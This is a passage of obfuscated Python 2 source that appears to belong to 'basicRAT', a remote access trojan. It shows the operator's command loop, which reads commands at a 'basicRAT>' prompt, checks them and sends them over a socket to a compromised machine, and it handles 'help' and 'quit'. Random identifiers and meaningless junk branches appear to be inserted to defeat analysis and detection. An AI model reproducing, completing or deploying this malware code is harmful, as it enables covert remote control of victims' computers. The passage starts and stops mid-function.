                    CmvNVNqUvAWwUjsqPAGnjljHqULPSmtA = IXTBDWJejMGHTTKMrMhPMOMkETnisxtT
    SCXvEteuykvAcchrxhrAjvYvMBGvaRtk = ejviyCNkcSZJfLMoBkJdCaGLsZpnMUmN(uoSImEUVWuLEVHmZeVLOwrcJSQoHkjAB, VDmlsrDtexgyuVPCdUUHUFLHIfLGCbOF=True)
    hTWxhdGoBBFSaebtWjZCoEjayKOtvPhU = 'sUduQPPOezdHXmhXODxKaianhrKZmSPU'
    DnyXAvEJZATfpZCSFDJYvoBLotobkdTs = 'DnYiwUDDyqKkBWkafdNqRKUeWmpxdDVD'
    yPfFhInrPsyOyWTJlgBpnHHimwQqXpok = 'CAJTdMtzozwTeAkIBaOidBSmEifDZuQW'
    ZyIeLcedFCNnHXnQZQoXnbXLCRwxXMpB = 'FdrfWumocoddrIiwEWyyIjmGtFrwuCIo'
    YxkHInSWRAsbpPTvxEOHPOyMzZdrKKZw = 'hABSxkCKLyiSinzipSwBdVSTItlXYRZj'
    ZdFMKKPGshHKmImSidDLxSUHfwHVcbDk = 'SCIeSYYxyCwZnZmbXQYkJNbLudvEWdnS'
    if hTWxhdGoBBFSaebtWjZCoEjayKOtvPhU != ZyIeLcedFCNnHXnQZQoXnbXLCRwxXMpB:
        DnyXAvEJZATfpZCSFDJYvoBLotobkdTs = yPfFhInrPsyOyWTJlgBpnHHimwQqXpok
        for ZdFMKKPGshHKmImSidDLxSUHfwHVcbDk in ZyIeLcedFCNnHXnQZQoXnbXLCRwxXMpB:
            if ZdFMKKPGshHKmImSidDLxSUHfwHVcbDk != yPfFhInrPsyOyWTJlgBpnHHimwQqXpok:
                DnyXAvEJZATfpZCSFDJYvoBLotobkdTs = DnyXAvEJZATfpZCSFDJYvoBLotobkdTs
            else:
                YxkHInSWRAsbpPTvxEOHPOyMzZdrKKZw = hTWxhdGoBBFSaebtWjZCoEjayKOtvPhU
    else:
        yPfFhInrPsyOyWTJlgBpnHHimwQqXpok = hTWxhdGoBBFSaebtWjZCoEjayKOtvPhU
        hTWxhdGoBBFSaebtWjZCoEjayKOtvPhU = YxkHInSWRAsbpPTvxEOHPOyMzZdrKKZw
        if yPfFhInrPsyOyWTJlgBpnHHimwQqXpok == hTWxhdGoBBFSaebtWjZCoEjayKOtvPhU:
            for ZdFMKKPGshHKmImSidDLxSUHfwHVcbDk in hTWxhdGoBBFSaebtWjZCoEjayKOtvPhU:
                if ZdFMKKPGshHKmImSidDLxSUHfwHVcbDk == yPfFhInrPsyOyWTJlgBpnHHimwQqXpok:
                    yPfFhInrPsyOyWTJlgBpnHHimwQqXpok = hTWxhdGoBBFSaebtWjZCoEjayKOtvPhU
                else:
                    yPfFhInrPsyOyWTJlgBpnHHimwQqXpok = YxkHInSWRAsbpPTvxEOHPOyMzZdrKKZw
    while True:
        sCrTCcpyfEDBxdrmiaqwxXVUsdDCvhNa = 'VTVRMhfaFIkMouQAHWwbFIHkslKsCoVR'
        bQxuzRMdBgLqgAewYKVThjccGhPujRjw = 'RSlWSoGaZEbirZqMmxfPsOOtvHFYaUDX'
        if sCrTCcpyfEDBxdrmiaqwxXVUsdDCvhNa != bQxuzRMdBgLqgAewYKVThjccGhPujRjw:
            gTWBpZAmksGhCLBuUubvLbrdPmCJLZGM = 'MntTirUlmuteBXrZdtCNTGhmdDbtcCJP'
            JdWYvlnrpAjExGhyyITZQozEmPJeSHPm = 'tcEhwHRdHvVgmyLurqbdpIUiaoHsxZGP'
            JdWYvlnrpAjExGhyyITZQozEmPJeSHPm = gTWBpZAmksGhCLBuUubvLbrdPmCJLZGM
        AeQgFeFlZLxmhQPxEnuPDikyRPVJdRkA = raw_input('\n[{}] basicRAT> '.format(IHFAGJXyRnwrpssXeFglUsxTJUDWGzur[0])).rstrip()
        ZzVjLscOrwlAuDLYOVeWETbOFkPiUyea = 'QgJKemrFpeSHdkEYOzCpfejDZQiuSfKx'
        VwDLLnWWNKJuEfFTmTNVrDhJfVstOzuT = 'hwzNpcTRiBVmVAivCbAffKbZULoSBwOQ'
        if ZzVjLscOrwlAuDLYOVeWETbOFkPiUyea != VwDLLnWWNKJuEfFTmTNVrDhJfVstOzuT:
            UPysvoCkCBfAXWoTREnBHUfrZNCrsmoG = 'DRFLRmrOJiZvLKospIcgTnClRlBrrIas'
            MuXQQeKjCXJcuQaHsVGPPLpTXHCBsspZ = 'WNQAkyoiStHnWkeerOCropxpUTNSPVkm'
            MuXQQeKjCXJcuQaHsVGPPLpTXHCBsspZ = UPysvoCkCBfAXWoTREnBHUfrZNCrsmoG
        if not AeQgFeFlZLxmhQPxEnuPDikyRPVJdRkA:
            GpWcXQTHqWVHemULNTPBjrOoLxiyDPIw = 'gMysQcAuQtGDBqqxuNDhbullIYIEhGXu'
            VntixxRkELkaHIDQrlxzEzlGFfqUWZdA = 'zQCdAVzKiVWnntpWEprqHYWYEeUpBWyv'
            OCXYaMpNLuHJtaAjlVySqFPmfCSfgNIF = 'ZbprBZTcWirhJOpkeWLxsyKYcruytExS'
            YuCAxCICOfraMpQeqwNBzntHDVIqnPfg = 'nWsLsfIdrYogLxfBcCYSFljDdiDPdPBJ'
            eAQFToJzDJRWfirWAVhXmQTPSXXfIGhh = 'ExZMREysvICnhfFleggDUYSzUUeUoked'
            eNRvDxXLGiWaBlVhIFpvefXUFZgYrBng = 'lkBIAKVURQuXHhuxDfUbkUGRTqdUJOZr'
            if GpWcXQTHqWVHemULNTPBjrOoLxiyDPIw != YuCAxCICOfraMpQeqwNBzntHDVIqnPfg:
                VntixxRkELkaHIDQrlxzEzlGFfqUWZdA = OCXYaMpNLuHJtaAjlVySqFPmfCSfgNIF
                for eNRvDxXLGiWaBlVhIFpvefXUFZgYrBng in YuCAxCICOfraMpQeqwNBzntHDVIqnPfg:
                    if eNRvDxXLGiWaBlVhIFpvefXUFZgYrBng != OCXYaMpNLuHJtaAjlVySqFPmfCSfgNIF:
                        VntixxRkELkaHIDQrlxzEzlGFfqUWZdA = VntixxRkELkaHIDQrlxzEzlGFfqUWZdA
                    else:
                        eAQFToJzDJRWfirWAVhXmQTPSXXfIGhh = GpWcXQTHqWVHemULNTPBjrOoLxiyDPIw
            else:
                OCXYaMpNLuHJtaAjlVySqFPmfCSfgNIF = GpWcXQTHqWVHemULNTPBjrOoLxiyDPIw
                GpWcXQTHqWVHemULNTPBjrOoLxiyDPIw = eAQFToJzDJRWfirWAVhXmQTPSXXfIGhh
                if OCXYaMpNLuHJtaAjlVySqFPmfCSfgNIF == GpWcXQTHqWVHemULNTPBjrOoLxiyDPIw:
                    for eNRvDxXLGiWaBlVhIFpvefXUFZgYrBng in GpWcXQTHqWVHemULNTPBjrOoLxiyDPIw:
                        if eNRvDxXLGiWaBlVhIFpvefXUFZgYrBng == OCXYaMpNLuHJtaAjlVySqFPmfCSfgNIF:
                            OCXYaMpNLuHJtaAjlVySqFPmfCSfgNIF = GpWcXQTHqWVHemULNTPBjrOoLxiyDPIw
                        else:
                            OCXYaMpNLuHJtaAjlVySqFPmfCSfgNIF = eAQFToJzDJRWfirWAVhXmQTPSXXfIGhh
            continue
            TyrXuqjUEuMtTjxhaxZkwSWTZDawYgWj = 'iEYUgJdeqHKIzXsIrYVAQtRicseZiUcz'
            tuQTRAJKOYcjnFsYmHOMOBeMOUbDJvTm = 'CoNLtvVfbJrIyQpxHSBMKNoZtnHNGSgm'
            kjVNpgQyLCkrvUelvXLmcdnLbbXXnouz = 'MCyEwdTEpFbvsvKOxVTxbzymYIMPJkxz'
            WaABOTFzGPswWSQjVBMSVaVFDsXeZUGh = 'YJrebfkFHBeXbYrAMdPvSGyLcIKiyCvh'
            JUAXYYhxbvWLkFNkljLmWiXEwEIxmPcz = 'DVYODWxaQysMjwartXwLbZlpWgYPmEXE'
            aIDityTogctgpuHlFTXXzMLKEDCGYYdI = 'JoXuezUlgWkcGUFpqayjCTFEzMvYodvW'
            if TyrXuqjUEuMtTjxhaxZkwSWTZDawYgWj != WaABOTFzGPswWSQjVBMSVaVFDsXeZUGh:
                tuQTRAJKOYcjnFsYmHOMOBeMOUbDJvTm = kjVNpgQyLCkrvUelvXLmcdnLbbXXnouz
                for aIDityTogctgpuHlFTXXzMLKEDCGYYdI in WaABOTFzGPswWSQjVBMSVaVFDsXeZUGh:
                    if aIDityTogctgpuHlFTXXzMLKEDCGYYdI != kjVNpgQyLCkrvUelvXLmcdnLbbXXnouz:
                        tuQTRAJKOYcjnFsYmHOMOBeMOUbDJvTm = tuQTRAJKOYcjnFsYmHOMOBeMOUbDJvTm
                    else:
                        JUAXYYhxbvWLkFNkljLmWiXEwEIxmPcz = TyrXuqjUEuMtTjxhaxZkwSWTZDawYgWj
            else:
                kjVNpgQyLCkrvUelvXLmcdnLbbXXnouz = TyrXuqjUEuMtTjxhaxZkwSWTZDawYgWj
                TyrXuqjUEuMtTjxhaxZkwSWTZDawYgWj = JUAXYYhxbvWLkFNkljLmWiXEwEIxmPcz
                if kjVNpgQyLCkrvUelvXLmcdnLbbXXnouz == TyrXuqjUEuMtTjxhaxZkwSWTZDawYgWj:
                    for aIDityTogctgpuHlFTXXzMLKEDCGYYdI in TyrXuqjUEuMtTjxhaxZkwSWTZDawYgWj:
                        if aIDityTogctgpuHlFTXXzMLKEDCGYYdI == kjVNpgQyLCkrvUelvXLmcdnLbbXXnouz:
                            kjVNpgQyLCkrvUelvXLmcdnLbbXXnouz = TyrXuqjUEuMtTjxhaxZkwSWTZDawYgWj
                        else:
                            kjVNpgQyLCkrvUelvXLmcdnLbbXXnouz = JUAXYYhxbvWLkFNkljLmWiXEwEIxmPcz
        lhiXsFxHuOAPadUCYJONTiuilGUagYDM, _, action = AeQgFeFlZLxmhQPxEnuPDikyRPVJdRkA.partition(' ')
        ncdzYWDYZmAUXdDCpQMqXcFWhLMqHMAU = 'sjbzVCSeyYyEgbIfZkxLfGbjHmhxSYtP'
        vuYmHuZFwFrCkpzOqyhcKsdrChZFVxip = 'CZnxkBLozLSDCXQTlbppAaUmPJQlxpeW'
        FpEjYezYcJvoEjdEUtbtJVGFjXOhlCuB = 'mwKhPDujaVnRHoLGswVxCkPlduDeLxGi'
        nyiZZfKPlJQlQrdeeYbhudWKJAqFFeAO = 'tdxhASESWiXuAEKxIMXoSSduUfEdupyu'
        kXUqvlFQxSEZDYTDqJThtuByQdnoYYjB = 'HrAmUzFUNkbofMhsjQvazAFgycBrhQXI'
        if ncdzYWDYZmAUXdDCpQMqXcFWhLMqHMAU in vuYmHuZFwFrCkpzOqyhcKsdrChZFVxip:
            ncdzYWDYZmAUXdDCpQMqXcFWhLMqHMAU = kXUqvlFQxSEZDYTDqJThtuByQdnoYYjB
            if vuYmHuZFwFrCkpzOqyhcKsdrChZFVxip in FpEjYezYcJvoEjdEUtbtJVGFjXOhlCuB:
                vuYmHuZFwFrCkpzOqyhcKsdrChZFVxip = nyiZZfKPlJQlQrdeeYbhudWKJAqFFeAO
        elif vuYmHuZFwFrCkpzOqyhcKsdrChZFVxip in ncdzYWDYZmAUXdDCpQMqXcFWhLMqHMAU:
            FpEjYezYcJvoEjdEUtbtJVGFjXOhlCuB = vuYmHuZFwFrCkpzOqyhcKsdrChZFVxip
            if FpEjYezYcJvoEjdEUtbtJVGFjXOhlCuB in vuYmHuZFwFrCkpzOqyhcKsdrChZFVxip:
                vuYmHuZFwFrCkpzOqyhcKsdrChZFVxip = kXUqvlFQxSEZDYTDqJThtuByQdnoYYjB
        if lhiXsFxHuOAPadUCYJONTiuilGUagYDM not in WIavQQQtDuOddPLHdhBtixjDDXzMoGRS:
            luawcbhrYaHgEiWqJmOpZOjewwNOlnNH = 'mOqzLsOOOPtQcYqKpXNDOLMQFsvfbmjM'
            hBUXsYLDRIZRuUicbRbXTXuvvwNkQSOw = 'hIUitvqmfRgtCQGeyyiIwipYNfjNkspw'
            LTBlKmgcZQKibJvvgWNQeIrdaZLcWOKM = 'dUOrTRJaWNIyWnOZSnuHxOWhWCUHcMQd'
            DYOfEAEhxnlBrSKTIEWGgHAbkgVPqwgm = 'tjMDYEzQlYxMZwCiyKWAosDvMOgUtbgB'
            ChxzZAwJtjbPhOpNunhvXQzGVwupQJah = 'CUAVYTyTVMdrqSFRtEkaRlsLJYBaPluH'
            bTDZelxFkcacqRwLZoizcgOgOUNZpzdI = 'UIeQUjPwQCHqrcoEDDnPjgmaYphMEkIe'
            if luawcbhrYaHgEiWqJmOpZOjewwNOlnNH != DYOfEAEhxnlBrSKTIEWGgHAbkgVPqwgm:
                hBUXsYLDRIZRuUicbRbXTXuvvwNkQSOw = LTBlKmgcZQKibJvvgWNQeIrdaZLcWOKM
                for bTDZelxFkcacqRwLZoizcgOgOUNZpzdI in DYOfEAEhxnlBrSKTIEWGgHAbkgVPqwgm:
                    if bTDZelxFkcacqRwLZoizcgOgOUNZpzdI != LTBlKmgcZQKibJvvgWNQeIrdaZLcWOKM:
                        hBUXsYLDRIZRuUicbRbXTXuvvwNkQSOw = hBUXsYLDRIZRuUicbRbXTXuvvwNkQSOw
                    else:
                        ChxzZAwJtjbPhOpNunhvXQzGVwupQJah = luawcbhrYaHgEiWqJmOpZOjewwNOlnNH
            else:
                LTBlKmgcZQKibJvvgWNQeIrdaZLcWOKM = luawcbhrYaHgEiWqJmOpZOjewwNOlnNH
                luawcbhrYaHgEiWqJmOpZOjewwNOlnNH = ChxzZAwJtjbPhOpNunhvXQzGVwupQJah
                if LTBlKmgcZQKibJvvgWNQeIrdaZLcWOKM == luawcbhrYaHgEiWqJmOpZOjewwNOlnNH:
                    for bTDZelxFkcacqRwLZoizcgOgOUNZpzdI in luawcbhrYaHgEiWqJmOpZOjewwNOlnNH:
                        if bTDZelxFkcacqRwLZoizcgOgOUNZpzdI == LTBlKmgcZQKibJvvgWNQeIrdaZLcWOKM:
                            LTBlKmgcZQKibJvvgWNQeIrdaZLcWOKM = luawcbhrYaHgEiWqJmOpZOjewwNOlnNH
                        else:
                            LTBlKmgcZQKibJvvgWNQeIrdaZLcWOKM = ChxzZAwJtjbPhOpNunhvXQzGVwupQJah
            tkTMYyKfMbWNQYAxiujVWPCojzGXehAD = 'bbLHVqaoIRvPriHXAqKbCHqbrLncRhif'
            OpBmMGYBNjDmeKXllkqsnXvcOMyaIFqB = 'dkAxNbZcqerTIULYDnhzylEzIRhXCOOe'
            mNjKutobcrswhZuzLFdkNspeJNWwmPuL = 'HqNIjsJwdursOwRaCnXJboTGLmBhCyJa'
            CYSoqmSVcgZCmaEGMKBXjTJjQUAFiBQy = 'ttmSOxRnvcSXFLlzBQOqpsIslMOqIsVp'
            lgCgZNUFVvVaoFZPKUlCsBHtScxVmNSU = 'vbQuvIlzuPIhfuMaFIeFlcZPLdPvRvHR'
            uavbHCRdZpLfYQXtaqLHvjWognraHIyq = 'ynOreOFRIUnXcMFsVzPXatUnKyoZXDtd'
            if tkTMYyKfMbWNQYAxiujVWPCojzGXehAD != CYSoqmSVcgZCmaEGMKBXjTJjQUAFiBQy:
                OpBmMGYBNjDmeKXllkqsnXvcOMyaIFqB = mNjKutobcrswhZuzLFdkNspeJNWwmPuL
                for uavbHCRdZpLfYQXtaqLHvjWognraHIyq in CYSoqmSVcgZCmaEGMKBXjTJjQUAFiBQy:
                    if uavbHCRdZpLfYQXtaqLHvjWognraHIyq != mNjKutobcrswhZuzLFdkNspeJNWwmPuL:
                        OpBmMGYBNjDmeKXllkqsnXvcOMyaIFqB = OpBmMGYBNjDmeKXllkqsnXvcOMyaIFqB
                    else:
                        lgCgZNUFVvVaoFZPKUlCsBHtScxVmNSU = tkTMYyKfMbWNQYAxiujVWPCojzGXehAD
            else:
                mNjKutobcrswhZuzLFdkNspeJNWwmPuL = tkTMYyKfMbWNQYAxiujVWPCojzGXehAD
                tkTMYyKfMbWNQYAxiujVWPCojzGXehAD = lgCgZNUFVvVaoFZPKUlCsBHtScxVmNSU
                if mNjKutobcrswhZuzLFdkNspeJNWwmPuL == tkTMYyKfMbWNQYAxiujVWPCojzGXehAD:
                    for uavbHCRdZpLfYQXtaqLHvjWognraHIyq in tkTMYyKfMbWNQYAxiujVWPCojzGXehAD:
                        if uavbHCRdZpLfYQXtaqLHvjWognraHIyq == mNjKutobcrswhZuzLFdkNspeJNWwmPuL:
                            mNjKutobcrswhZuzLFdkNspeJNWwmPuL = tkTMYyKfMbWNQYAxiujVWPCojzGXehAD
                        else:
                            mNjKutobcrswhZuzLFdkNspeJNWwmPuL = lgCgZNUFVvVaoFZPKUlCsBHtScxVmNSU
            continue
            uuGGgWRZsFUYGeYwMnFVvLZhNcpIDhqq = 'lliNeoCMbekdEUaPQtHHDJlgTlNwExTz'
            FIWGEKsimpponPeoVnvNFJPnckWbaliU = 'yQDMiFiEBvOzkbNyAVthBenAKbLXypWc'
            if uuGGgWRZsFUYGeYwMnFVvLZhNcpIDhqq != FIWGEKsimpponPeoVnvNFJPnckWbaliU:
                FxhphwLBPFUrTaDayCMeOpcTaDlWUDeT = 'DRqNMigHJbXDntwMjswkesDJlhDTFMfQ'
                XuepOIAuhAQZDjvVPKsekohzqxfrLTPq = 'ZuyCXDyFIClutcxuaVTzOsZVixyrJQAB'
                XuepOIAuhAQZDjvVPKsekohzqxfrLTPq = FxhphwLBPFUrTaDayCMeOpcTaDlWUDeT
        if lhiXsFxHuOAPadUCYJONTiuilGUagYDM == 'help':
            hWUYMVsbuiKqgmCNwinPBSNASPKHZfpL = 'wuFpIEuEWgiEbEGSxKgWWuXGKQOZaKpq'
            CtWuWmqpApXWblAuKpHGoNqcUzOEBYdY = 'fufCzKwOfmFfsiiMvSIhAgYNgjAkaPpU'
            uNgRhUygoMnjVylRxMiyKAXYwerSsIle = 'lrRaWfhxmxGfUFDMSGOITGrJWEBnTuFh'
            GurOTnIgIELElbDgedmorydrjLufIHuN = 'GdKdMNmRiITIjCRFsisVTiyseMCdfQat'
            lXrpizsBZDvNOmbAUjaWgTmCnLnVdXCO = 'dlqwGqoQksCVHehCQhEqpLdHdAlQXIkb'
            cLyErcXgNTkMBPSvlKLkHIrUmvbaqwnp = 'oBaQZBAFClOqtiOHZtHomeJSsNcNTyph'
            if uNgRhUygoMnjVylRxMiyKAXYwerSsIle == GurOTnIgIELElbDgedmorydrjLufIHuN:
                for cLyErcXgNTkMBPSvlKLkHIrUmvbaqwnp in lXrpizsBZDvNOmbAUjaWgTmCnLnVdXCO:
                    if cLyErcXgNTkMBPSvlKLkHIrUmvbaqwnp == GurOTnIgIELElbDgedmorydrjLufIHuN:
                        lXrpizsBZDvNOmbAUjaWgTmCnLnVdXCO = hWUYMVsbuiKqgmCNwinPBSNASPKHZfpL
                    else:
                        GurOTnIgIELElbDgedmorydrjLufIHuN = CtWuWmqpApXWblAuKpHGoNqcUzOEBYdY
            GtOWUXZXAYifDiWrJAewbJSJwEdbiDZB = 'lhRURVnglZHCKkvPcDGvtSTRonjAkcnJ'
            eulWauhsMlkhCPjjdDXeIktRKeyfcWqX = 'HyrHVbpSWzjEmOZQCrroDOgUBPOAYGef'
            GejqBEZKIXREgNBIaifXwBWsOnGFhnDH = 'PmalzUAnVFfwieHsFNKHyiKoeeDEWzyT'
            zrOhwNrjXLGUUqWyxZjlFqnfHzsatqgO = 'LsBhyWxnHyTZxlDkdTdlyVbBptAkjmyl'
            UTMxypjZFcKTftpwEClxPSxKvppRPIka = 'fhdMlwFPabpAhUcHPDOseeZkncjkqntN'
            MmgfdzrzfpnEndjhLenbTSnMZPFumpQb = 'kjlIaIfzZDlJpeYUcSfQHGelVCxvwHCY'
            if GtOWUXZXAYifDiWrJAewbJSJwEdbiDZB != zrOhwNrjXLGUUqWyxZjlFqnfHzsatqgO:
                eulWauhsMlkhCPjjdDXeIktRKeyfcWqX = GejqBEZKIXREgNBIaifXwBWsOnGFhnDH
                for MmgfdzrzfpnEndjhLenbTSnMZPFumpQb in zrOhwNrjXLGUUqWyxZjlFqnfHzsatqgO:
                    if MmgfdzrzfpnEndjhLenbTSnMZPFumpQb != GejqBEZKIXREgNBIaifXwBWsOnGFhnDH:
                        eulWauhsMlkhCPjjdDXeIktRKeyfcWqX = eulWauhsMlkhCPjjdDXeIktRKeyfcWqX
                    else:
                        UTMxypjZFcKTftpwEClxPSxKvppRPIka = GtOWUXZXAYifDiWrJAewbJSJwEdbiDZB
            else:
                GejqBEZKIXREgNBIaifXwBWsOnGFhnDH = GtOWUXZXAYifDiWrJAewbJSJwEdbiDZB
                GtOWUXZXAYifDiWrJAewbJSJwEdbiDZB = UTMxypjZFcKTftpwEClxPSxKvppRPIka
                if GejqBEZKIXREgNBIaifXwBWsOnGFhnDH == GtOWUXZXAYifDiWrJAewbJSJwEdbiDZB:
                    for MmgfdzrzfpnEndjhLenbTSnMZPFumpQb in GtOWUXZXAYifDiWrJAewbJSJwEdbiDZB:
                        if MmgfdzrzfpnEndjhLenbTSnMZPFumpQb == GejqBEZKIXREgNBIaifXwBWsOnGFhnDH:
                            GejqBEZKIXREgNBIaifXwBWsOnGFhnDH = GtOWUXZXAYifDiWrJAewbJSJwEdbiDZB
                        else:
                            GejqBEZKIXREgNBIaifXwBWsOnGFhnDH = UTMxypjZFcKTftpwEClxPSxKvppRPIka
            continue
            BMROTneqZZRbgOzpUMBqEPOAbcWgXjNu = 'aFpYqvDekeJrNcIxYUSKXxGPfnaMVDAh'
            NmtLVFCtibpGrMMNkiqBsrJXFohEGGGw = 'KWOFvtubDXLoTpmecdLKnffvsHfnPVsu'
            WqrfqtQzqaybIgmkliUhPzXMNAEDcsOr = 'dETpknbnjNaeanEJrznVxfoEiGSKmfRh'
            rLBdKsPuoazwkuqZquXSZdCGhStbARSV = 'iDhOowpcvuyTHtycqbsJQyPNhAMwwMkC'
            myUavTkdkRzsVUGkWlmqasNLdtplYKyP = 'woCYvZXlKHUOiHkEIzflWalTDMoDuNzr'
            WbQzxUWZdoIteXwjNtfEzFsdmtGSozKi = 'tFsvTTENHDZHSmGKTYvuahoLKtfmJVDm'
            if BMROTneqZZRbgOzpUMBqEPOAbcWgXjNu != rLBdKsPuoazwkuqZquXSZdCGhStbARSV:
                NmtLVFCtibpGrMMNkiqBsrJXFohEGGGw = WqrfqtQzqaybIgmkliUhPzXMNAEDcsOr
                for WbQzxUWZdoIteXwjNtfEzFsdmtGSozKi in rLBdKsPuoazwkuqZquXSZdCGhStbARSV:
                    if WbQzxUWZdoIteXwjNtfEzFsdmtGSozKi != WqrfqtQzqaybIgmkliUhPzXMNAEDcsOr:
                        NmtLVFCtibpGrMMNkiqBsrJXFohEGGGw = NmtLVFCtibpGrMMNkiqBsrJXFohEGGGw
                    else:
                        myUavTkdkRzsVUGkWlmqasNLdtplYKyP = BMROTneqZZRbgOzpUMBqEPOAbcWgXjNu
            else:
                WqrfqtQzqaybIgmkliUhPzXMNAEDcsOr = BMROTneqZZRbgOzpUMBqEPOAbcWgXjNu
                BMROTneqZZRbgOzpUMBqEPOAbcWgXjNu = myUavTkdkRzsVUGkWlmqasNLdtplYKyP
                if WqrfqtQzqaybIgmkliUhPzXMNAEDcsOr == BMROTneqZZRbgOzpUMBqEPOAbcWgXjNu:
                    for WbQzxUWZdoIteXwjNtfEzFsdmtGSozKi in BMROTneqZZRbgOzpUMBqEPOAbcWgXjNu:
                        if WbQzxUWZdoIteXwjNtfEzFsdmtGSozKi == WqrfqtQzqaybIgmkliUhPzXMNAEDcsOr:
                            WqrfqtQzqaybIgmkliUhPzXMNAEDcsOr = BMROTneqZZRbgOzpUMBqEPOAbcWgXjNu
                        else:
                            WqrfqtQzqaybIgmkliUhPzXMNAEDcsOr = myUavTkdkRzsVUGkWlmqasNLdtplYKyP
        uoSImEUVWuLEVHmZeVLOwrcJSQoHkjAB.send(yMJpVmADtfOFNuYBnBVUdcWvfJqpMgZu(AeQgFeFlZLxmhQPxEnuPDikyRPVJdRkA, SCXvEteuykvAcchrxhrAjvYvMBGvaRtk))
        IRChKwcRwJrkAifNDuCAqKUTjwJwvecn = 'eNYlxbvuIVVzNAsEffqiEeKwSABktfGb'
        POSXPcunsrGFdRGFDyNyzJdwFYHvaCZL = 'vqmZTXCpdPItztVAhZuzabhWOzhGolgI'
        fWKyIFNcDGtLnRqEVnxNUCxZQDqsRsxe = 'VMRKFotaKCGiXihilVqGTECeLoqOftXu'
        TAzKVXsStHzbsHNQpVEGtChVOeAoxGDJ = 'eWpHDmJdMLJOVoqOmXOKlUzqIBAsxnlJ'
        aqOFjxTUkcRDKRdhtBEkUKuNQcjiXsmw = 'ZkejUqSvPkzSMQkppzTvnYMxGvVIiSuh'
        ygTMjZiRHtGzitcvduueOBdoOgiyavCS = 'lyGMrsXeDtuOJMYyaMMfSHDyFpBhKvpD'
        if IRChKwcRwJrkAifNDuCAqKUTjwJwvecn != TAzKVXsStHzbsHNQpVEGtChVOeAoxGDJ:
            POSXPcunsrGFdRGFDyNyzJdwFYHvaCZL = fWKyIFNcDGtLnRqEVnxNUCxZQDqsRsxe
            for ygTMjZiRHtGzitcvduueOBdoOgiyavCS in TAzKVXsStHzbsHNQpVEGtChVOeAoxGDJ:
                if ygTMjZiRHtGzitcvduueOBdoOgiyavCS != fWKyIFNcDGtLnRqEVnxNUCxZQDqsRsxe:
                    POSXPcunsrGFdRGFDyNyzJdwFYHvaCZL = POSXPcunsrGFdRGFDyNyzJdwFYHvaCZL
                else:
                    aqOFjxTUkcRDKRdhtBEkUKuNQcjiXsmw = IRChKwcRwJrkAifNDuCAqKUTjwJwvecn
        else:
            fWKyIFNcDGtLnRqEVnxNUCxZQDqsRsxe = IRChKwcRwJrkAifNDuCAqKUTjwJwvecn
            IRChKwcRwJrkAifNDuCAqKUTjwJwvecn = aqOFjxTUkcRDKRdhtBEkUKuNQcjiXsmw
            if fWKyIFNcDGtLnRqEVnxNUCxZQDqsRsxe == IRChKwcRwJrkAifNDuCAqKUTjwJwvecn:
                for ygTMjZiRHtGzitcvduueOBdoOgiyavCS in IRChKwcRwJrkAifNDuCAqKUTjwJwvecn:
                    if ygTMjZiRHtGzitcvduueOBdoOgiyavCS == fWKyIFNcDGtLnRqEVnxNUCxZQDqsRsxe:
                        fWKyIFNcDGtLnRqEVnxNUCxZQDqsRsxe = IRChKwcRwJrkAifNDuCAqKUTjwJwvecn
                    else:
                        fWKyIFNcDGtLnRqEVnxNUCxZQDqsRsxe = aqOFjxTUkcRDKRdhtBEkUKuNQcjiXsmw
        if lhiXsFxHuOAPadUCYJONTiuilGUagYDM == 'quit':
            wOyhXBfxySwBHzPzcczcmGMkhOYXcoPQ = 'oUwNRdFeXBKJVsbMufjvBATGzeRuoCEf'
            EahsIFXOVlwAlNozlKVupYPYnxpQnaKo = 'UMZBFlMjPINuwBloZVZZhIbaWfLHNdFN'
            hKlcnGHKdVzUYiWcZfuOSJSaDCddHAmC = 'BvwBjYiGrDvPYKxwpTEltjhhbTmRbiwl'
            vOjAHAxDiHdvMJcgDLcHybaWxILjOEXC = 'zDSVbohRoMoqMjSGqAbGelaKTKVePAao'
            JAoOaMgJMKuUfxNWcWIJplRFodnCNRjs = 'RGpTBvRKBfPpGPhnolwmQHQYqagzZAhD'
            if wOyhXBfxySwBHzPzcczcmGMkhOYXcoPQ in EahsIFXOVlwAlNozlKVupYPYnxpQnaKo:
                wOyhXBfxySwBHzPzcczcmGMkhOYXcoPQ = JAoOaMgJMKuUfxNWcWIJplRFodnCNRjs
                if EahsIFXOVlwAlNozlKVupYPYnxpQnaKo in hKlcnGHKdVzUYiWcZfuOSJSaDCddHAmC:
                    EahsIFXOVlwAlNozlKVupYPYnxpQnaKo = vOjAHAxDiHdvMJcgDLcHybaWxILjOEXC
            elif EahsIFXOVlwAlNozlKVupYPYnxpQnaKo in wOyhXBfxySwBHzPzcczcmGMkhOYXcoPQ:
                hKlcnGHKdVzUYiWcZfuOSJSaDCddHAmC = EahsIFXOVlwAlNozlKVupYPYnxpQnaKo
                if hKlcnGHKdVzUYiWcZfuOSJSaDCddHAmC in EahsIFXOVlwAlNozlKVupYPYnxpQnaKo:
                    EahsIFXOVlwAlNozlKVupYPYnxpQnaKo = JAoOaMgJMKuUfxNWcWIJplRFodnCNRjs
            NnAHEyzstOAhyDIxNvEBiZNNgIEkjaKT.close()
            lpWJclDGsXSyIQzotaXsagzulQLKbuwX = 'vZfkAIJkeKbaqHDHZpYQdhzNmdcyNsYs'
            LxxBmcPkRdEqvlEexrPOBFzXuQaUNnAL = 'bCxPQpdUAsaJxMzQczfOnyegZuunKkTs'
            UJoGndgNndnaludySbuOvduZHWnuvPyR = 'YJoXUFAEJaGmJZUrbbZUoIGsFxKyaWCK'
            hdneTuXuWbdRpyGkXBxilyTJyyGqIwbB = 'gMmwOTpRFFszHCiBuoVGJCAQhutsigmO'
            HckHptAJuiUOmDdXjfwwbmuxFtkChmvA = 'UndHHHXIOpqbtSrLQGGBYMgttBBZrzea'
            dwccASqldapyCyfVFKoWjWNEqkekBBAT = 'wKhPGDokIuxZdyBGmhevragLQzQBRLzA'
            if UJoGndgNndnaludySbuOvduZHWnuvPyR == hdneTuXuWbdRpyGkXBxilyTJyyGqIwbB:
                for dwccASqldapyCyfVFKoWjWNEqkekBBAT in HckHptAJuiUOmDdXjfwwbmuxFtkChmvA:
                    if dwccASqldapyCyfVFKoWjWNEqkekBBAT == hdneTuXuWbdRpyGkXBxilyTJyyGqIwbB:
                        HckHptAJuiUOmDdXjfwwbmuxFtkChmvA = lpWJclDGsXSyIQzotaXsagzulQLKbuwX
                    else:
                        hdneTuXuWbdRpyGkXBxilyTJyyGqIwbB = LxxBmcPkRdEqvlEexrPOBFzXuQaUNnAL
            sys.exit(0)
            QWgWZEsLAqGbzfpqgphgbHIYbzZPFovx = 'mchkMELOKCfPEMVYXCcVxznSAucrvGPt'
